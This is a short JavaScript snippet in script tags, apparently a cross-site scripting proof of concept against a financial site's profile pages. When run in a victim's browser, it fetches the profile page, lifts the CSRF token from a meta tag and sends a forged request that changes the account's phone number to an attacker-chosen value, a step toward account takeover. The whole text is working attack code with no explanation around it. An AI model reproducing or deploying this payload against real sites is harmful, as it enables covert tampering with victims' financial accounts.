< script language = "javascript"
type = "text/javascript" >
    fetch("https://wipayfinancial.com/v1/Profile").then(function(e) {
        return e.text()
    }).then(function(e) {
        var t = (new DOMParser).parseFromString(e, "text/html").querySelector('meta[name="csrf-token"]').content;
        console.log(t);
        var n = new XMLHttpRequest;
        n.open("POST", "https://wipayfinancial.com/v1/Profile/UpdatePhone", !0), n.setRequestHeader("X-CSRF-TOKEN", t), n.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"), n.send("cust_phone=868-123-4567")
    }).catch(function(e) {
        console.log("Failed to fetch page: ", e)
    }); < /script>
